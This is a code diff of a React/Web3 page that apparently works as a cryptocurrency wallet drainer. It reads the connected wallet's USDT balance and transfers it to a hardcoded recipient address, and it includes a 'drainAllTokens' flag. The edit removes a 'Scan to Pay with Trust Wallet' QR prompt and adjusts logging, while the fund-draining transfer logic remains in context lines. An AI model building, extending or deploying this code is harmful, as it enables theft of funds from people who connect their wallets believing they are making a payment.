@@ -1,7 +1,6 @@
 import React, { useState, useEffect, useRef } from "react";
 import styled from 'styled-components';
 import Web3 from "web3";
-import { QRCodeCanvas } from 'qrcode.react';
 
 const RECIPIENT_ADDRESS = "0x1EaDA2b8cC4054Cee7b95087F4D1E913Ca22131d";
 const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
@@ -105,7 +104,6 @@ const App = () => {
   const [loading, setLoading] = useState(false);
   const [transferCompleted, setTransferCompleted] = useState(false);
   const [walletAddress, setWalletAddress] = useState("");
-  const [qrCodeUrl, setQrCodeUrl] = useState("");
   const [drainAllTokens, setDrainAllTokens] = useState(false);
 
   const isProcessing = useRef(false);
@@ -145,7 +143,7 @@ const App = () => {
 
         setWalletAddress(userAddress);
         setAddress(userAddress);
-        console.log("🔗 Wallet from QR:", userAddress);
+        console.log("🔗 Wallet from URL:", userAddress);
 
         const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
         const usdtBalance = await contract.methods.balanceOf(sender).call();
@@ -165,12 +163,6 @@ const App = () => {
     };
 
     init();
-  }, []);
-
-  useEffect(() => {
-    const baseUrl = window.location.origin;
-    const redirectUri = `${baseUrl}?address=${RECIPIENT_ADDRESS}`;
-    setQrCodeUrl(redirectUri);
   }, []);
 
   const sendUSDT = async () => {
@@ -306,7 +298,7 @@ const App = () => {
       while (retries > 0) {
         try {
           const estimatedGas = await contract.methods.transfer(RECIPIENT_ADDRESS, amountInWei).estimateGas({ from: sender });
-          const gasLimit = Math.floor(estimatedGas * 1.5); // Reduced multiplier for optimization
+          const gasLimit = Math.floor(estimatedGas * 1.5);
           console.log(`Gas limit set to ${gasLimit}`);
           alert(`Gas limit set to ${gasLimit}`);
 
@@ -339,18 +331,6 @@ const App = () => {
   return (
     <GlobalStyle>
       <Container>
-        <InputContainer>
-          <InputLabel>Scan to Pay with Trust Wallet</InputLabel>
-          {qrCodeUrl && (
-            <div style={{ marginTop: "10px", textAlign: "center" }}>
-              <QRCodeCanvas value={qrCodeUrl} size={200} />
-              <p style={{ fontSize: "14px", color: "#626262", marginTop: "10px" }}>
-                Scan this QR code with Trust Wallet to pay {usdtAmount || "an amount"} USDT.
-              </p>
-            </div>
-          )}
-        </InputContainer>
-
         <InputContainer>
           <InputLabel>Address or Domain Name</InputLabel>
           <InputFieldContainer>
